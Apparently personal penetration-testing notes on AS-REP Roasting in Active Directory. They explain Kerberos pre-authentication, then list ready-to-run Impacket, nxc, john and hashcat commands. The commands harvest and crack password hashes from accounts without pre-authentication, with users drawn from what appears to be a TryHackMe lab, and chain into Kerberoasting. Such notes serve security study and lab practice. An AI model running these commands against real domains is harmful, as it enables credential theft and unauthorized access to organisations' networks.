#AD_AS-REP_Roasting


> [!info] What is AS-REP Roasting?
> AS-REP Roasting is an Active Directory attack where you request encrypted password hashes for accounts that don’t require Kerberos pre-authentication, and then crack the hashes offline.


# <span style="color:#FF5555">Explanation</span>

### <span style="color:#50FA7B">Normal Kerberos Authentication Flow</span>

- **AS-REQ (Authentication Service Request):** The client requests a Ticket Granting Ticket (TGT) from the Key Distribution Center / Domain Controller (KDC/DC).
    
- **Pre-Authentication:** The client proves its identity by encrypting a **timestamp** using a secret key derived from the user's password.
    
- **AS-REP (Authentication Service Response):** The KDC verifies the timestamp and returns an AS-REP containing the TGT (which includes encrypted data derived from the user's long-term Kerberos key).
    
- **Next Flow:** The user proceeds to the Ticket Granting Service (TGS) exchange to request service tickets.
    

### <span style="color:#50FA7B">When `DONT_REQ_PREAUTH` is Enabled</span>

When an account has the **`DONT_REQ_PREAUTH`** flag enabled (a.k.a. _"Do not require Kerberos preauthentication"_), the user is **not required** to prove their identity during the initial request.

1. **AS-REQ:** An attacker sends an `AS-REQ` to the KDC for that specific username. No pre-authentication is provided.
    
2. **Pre-Authentication:** Skipped entirely (because the control is disabled).
    
3. **AS-REP:** The KDC immediately returns an `AS-REP` containing an encrypted TGT **without verifying the requester's identity**.
    

> [!info] Key Point
> While no plaintext password is sent directly, the returned `AS-REP` contains encrypted ticket data. An attacker can take this response offline and attempt to **crack the user's password using brute-force tools** (AS-REP Roasting).




___
# <span style="color:#FF5555">Step-by-Step Attack:-</span>


# <span style="color:#FF5555">Scenario 1 — Unauthenticated (username list)</span>

You don't have creds, but you enumerated valid usernames (RID cycling, OSINT, null session, etc.).
```bash
# Impacket — spray a userlist, request AS-REPs, save hashcat-format hashes
# GetNPUsers -> Users with `No Pre-Authentication` required
GetNPUsers.py '$DOMAIN/' -usersfile users.txt -no-pass -dc-ip $DC_IP -format hashcat -outputfile as-rep.txt

# nxc — needs anonymous LDAP bind to be allowed (rare on modern DCs),
# otherwise use Scenario 2 with creds
nxc ldap $DC_IP -u users.txt -p '' --asreproast as-rep.txt
```

- `-u users.txt`: A list of usernames to test.
- `-p '' ` : Blank password (we're not logging in).
- `--asreproast` : Enables AS-REP roasting.
- `output.txt`: File where captured hashes will be saved

![[Pasted image 20260415152211.png]]
___


## <span style="color:#8BE9FD">Scenario 2 — Authenticated (query LDAP for the flag)</span>

You have any valid domain credential. This lets you ask LDAP _which_ accounts are roastable instead of guessing, then request only those. Preferred when possible.

## <span style="color:#8BE9FD">Without BloodHound</span>
```bash
# Impacket — -request auto-finds DONT_REQ_PREAUTH accounts and roasts them
GetNPUsers.py '$DOMAIN/user:Password123' -request -dc-ip $DC_IP -format hashcat -outputfile as-rep.txt

# nxc
nxc ldap $DC_IP -u $USER -p '$PASS' --asreproast as-rep.txt
```

## <span style="color:#8BE9FD">With BloodHound</span>

OR  when you uploaded the files to bloodhound GUI

Checking for AS-REP Roastable users,

<img width="1206" height="627" alt="image" src="https://github.com/user-attachments/assets/41aea20e-414a-4256-954b-9ea7d6ab7079" />

suppose in this case we have three users 

- ERNESTO_SILVA@THM.CORP
- TABATHA_BRITT@THM.CORP
- LEANN_LONG@THM.CORP


## <span style="color:#8BE9FD">Requesting hashes for specific users</span>

Using impacket’s `GetNPUsers.py` to request a tgt for the users.

```bash
$ GetNPUsers.py -request -format john -no-pass $DOMAIN/ERNESTO_SILVA
$ GetNPUsers.py -request -format john -no-pass $DOMAIN/TABATHA_BRITT
$ GetNPUsers.py -request -format john -no-pass $DOMAIN/LEANN_LONG
```


# <span style="color:#FF5555">Crack the Ticket</span>

```bash
john --wordlist=/home/kali/Documents/password.txt ./as-rep.txt 
hashcat -m 18200 ./as-rep.txt /home/kali/Documents/password.txt
```

![[Pasted image 20260415151946.png]]


# <span style="color:#FF5555">Can't crack the hash? Kerberoast *through* the AS-REP account</span>

If an account is AS-REP roastable but its hash won't crack, you can still use that account (no password needed) to request TGS tickets for SPN accounts and Kerberoast them.

### <span style="color:#50FA7B">Method 1 — Impacket GetUserSPNs (`-no-preauth`)</span>
```bash
GetUserSPNs.py -no-preauth "asrep_user" -usersfile spn_targets.txt \
  -dc-host dc.$DOMAIN $DOMAIN/ -outputfile roasted.txt
```
- `asrep_user` = the pre-auth-disabled account (no password needed).
- `spn_targets.txt` = candidate usernames that hold SPNs (you supply these).
- Output = TGS-REP hashes to crack.

### <span style="color:#50FA7B">Method 2 — nxc</span>
```bash
nxc ldap dc.$DOMAIN -u $USER -p '' --kerberoasting roasted.txt
```

### <span style="color:#50FA7B">Then crack</span>
```bash
hashcat -m 13100 roasted.txt rockyou.txt   # TGS-REP (Kerberoast)
```